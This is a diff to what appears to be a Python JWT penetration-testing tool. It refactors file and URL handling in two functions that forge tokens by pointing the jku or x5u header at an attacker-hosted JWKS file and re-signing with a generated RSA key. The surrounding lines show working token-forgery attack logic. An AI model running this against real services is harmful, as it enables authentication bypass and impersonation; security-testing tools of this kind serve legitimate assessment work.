@@ -254,11 +254,15 @@ def jku_vulnerability(jwt=None, url=None, file=None, pem=None):
         raise InvalidJWT("Invalid JWT format JKU missing")
 
     if file is None:
-        file = "jwk-python"
+        file = "jwk-python.json"
     jwks = requests.get(jwt_json[HEADER]["jku"]).json()
 
     jwt_json[HEADER]["alg"] = "RS256"
-    jwt_json[HEADER]["jku"] = f"{url}/{file}.json"
+    if ".json" not in file:
+        file += ".json"
+    if not url.endswith("/"):
+        url += "/"
+    jwt_json[HEADER]["jku"] = f"{url}{file}"
     if pem is None:
         key = crypto.PKey()
         key.generate_key(type=crypto.TYPE_RSA, bits=2048)
@@ -285,7 +289,7 @@ def jku_vulnerability(jwt=None, url=None, file=None, pem=None):
         .rstrip("=")
     )
 
-    f = open(f"{file}.json", "w")
+    f = open(file, "w")
     f.write(json.dumps(jwks))
     f.close()
 
@@ -300,7 +304,7 @@ def jku_vulnerability(jwt=None, url=None, file=None, pem=None):
     return s + "." + base64.urlsafe_b64encode(sign).decode("UTF-8").rstrip("=")
 
 
-def x5u_vulnerability(jwt=None, url=None, crt=None, pem=None):
+def x5u_vulnerability(jwt=None, url=None, crt=None, pem=None, file=None):
     """
     Check jku Vulnerability.
 
@@ -314,6 +318,8 @@ def x5u_vulnerability(jwt=None, url=None, crt=None, pem=None):
         crt path file
     pem: str
        pem file name
+    file: str
+        jwks file name
 
     Returns
     -------
@@ -322,6 +328,8 @@ def x5u_vulnerability(jwt=None, url=None, crt=None, pem=None):
     """
     if not is_valid_jwt(jwt):
         raise InvalidJWT("Invalid JWT format")
+    if file is None:
+        file = "jwks_with_x5c.json"
 
     jwt_json = jwt_to_json(jwt)
     if "x5u" not in jwt_json[HEADER]:
@@ -339,10 +347,13 @@ def x5u_vulnerability(jwt=None, url=None, crt=None, pem=None):
         .replace("-----BEGIN CERTIFICATE-----", "")
         .replace("\n", "")
     )
+    if ".json" not in file:
+        file += ".json"
+    if not url.endswith("/"):
+        url += "/"
+    jwt_json[HEADER]["x5u"] = f"{url}{file}"
 
-    jwt_json[HEADER]["x5u"] = url
-
-    f = open("jwks_with_x5c.json", "w")
+    f = open(file, "w")
     f.write(json.dumps(x5u))
     f.close()
 
